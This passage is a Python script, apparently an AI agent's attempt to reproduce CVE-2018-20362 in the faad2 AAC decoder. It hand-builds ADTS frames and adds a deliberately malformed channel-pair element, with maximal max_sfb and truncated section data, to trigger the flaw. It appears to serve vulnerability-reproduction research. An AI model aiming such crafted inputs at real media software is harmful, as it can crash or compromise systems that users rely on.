 0, 0, 1])  # sect_len = 1\n        # End marker\n        bits.extend([0, 0, 0, 0])  # sect_cb = 0\n        bits.extend([0, 0, 0, 0, 0])  # sect_len = 0\n    \n    bits.append(0)  # pulse_data_present\n    bits.append(0)  # tns_data_present\n    bits.append(0)  # gain_control_data_present\n    \n    # Channel 2 individual_channel_stream\n    bits.extend([1, 0, 0, 0, 0, 0, 0, 0])  # global_gain = 128\n    \n    # section_data for channel 2\n    for g in range(8):\n        for sfb in range(7):\n            bits.extend([0, 0, 0, 0])\n            bits.extend([0, 0, 0, 0, 1])\n        bits.extend([0, 0, 0, 0])\n        bits.extend([0, 0, 0, 0, 0])\n    \n    bits.append(0)  # pulse_data_present\n    bits.append(0)  # tns_data_present\n    bits.append(0)  # gain_control_data_present\n    \n    # Convert to bytes\n    byte_data = bytearray()\n    for i in range(0, len(bits), 8):\n        byte_val = 0\n        for j in range(8):\n            if i + j < len(bits):\n                byte_val = (byte_val << 1) | bits[i + j]\n            else:\n                byte_val = byte_val << 1\n        byte_data.append(byte_val)\n    \n    return bytes(byte_data)\n\ndef make_malformed_cpe():\n    """\n    Create a malformed CPE that might cause issues during allocation\n    Try to create edge cases in parsing\n    """\n    bits = []\n    \n    # ID_CPE\n    bits.extend([0, 0, 1])\n    bits.extend([0, 0, 0, 1])  # instance tag 1\n    \n    # Common window\n    bits.append(1)\n    \n    # ICS Info with EIGHT_SHORT_SEQUENCE\n    bits.append(0)\n    bits.extend([1, 0])  # EIGHT_SHORT_SEQUENCE\n    bits.append(1)  # different window_shape\n    \n    # max_sfb: use maximum value\n    bits.extend([1, 1, 1, 1])  # 15\n    \n    # grouping\n    bits.extend([1, 0, 1, 0, 1, 0, 1])\n    \n    # ms_mask\n    bits.extend([0, 0])\n    \n    # Minimal channel data to keep it parseable\n    bits.extend([1, 1, 1, 1, 1, 1, 1, 1])  # global_gain = 255\n    \n    # Truncated section data - this might cause issues\n    for _ in range(4):\n        bits.extend([0, 0, 0, 0, 0, 0, 0, 0, 0])\n    \n    # Convert to bytes\n    byte_data = bytearray()\n    for i in range(0, len(bits), 8):\n        byte_val = 0\n        for j in range(8):\n            if i + j < len(bits):\n                byte_val = (byte_val << 1) | bits[i + j]\n            else:\n                byte_val = byte_val << 1\n        byte_data.append(byte_val)\n    \n    return bytes(byte_data)\n\ndef generate_testcase(output_path):\n    """Generate multi-frame AAC file with various CPE configurations"""\n    \n    frames = []\n    \n    # Frame 1: Normal CPE with EIGHT_SHORT_SEQUENCE\n    frame1_data = make_cpe_with_eight_short()\n    frame1 = make_adts_header(len(frame1_data)) + frame1_data\n    frames.append(frame1)\n    \n    # Frame 2: Another normal frame\n    frame2_data = make_cpe_with_eight_short()\n    frame2 = make_adts_header(len(frame2_data)) + frame2_data\n    frames.append(frame2)\n    \n    # Frame 3: Malformed frame to trigger edge case\n    frame3_data = make_malformed_cpe()\n    frame3 = make_adts_header(len(frame3_data)) + frame3_data\n    frames.append(frame3)\n    \n    # Write all frames\n    with open(output_path, \'wb\') as f:\n        for frame in frames:\n            f.write(frame)\n    \n    total_size = sum(len(f) for f in frames)\n    print(f"Generated testcase at {output_path}")\n    print(f"Total frames: {len(frames)}")\n    print(f"Total size: {total_size} bytes")\n\nif __name__ == "__main__":\n    output_path = "/home/ubuntu/PoV/DrillAgent/workspace-sonnet/faad2.cve-2018-20362/round2/testcase-round2"\n    generate_testcase(output_path)\n'}
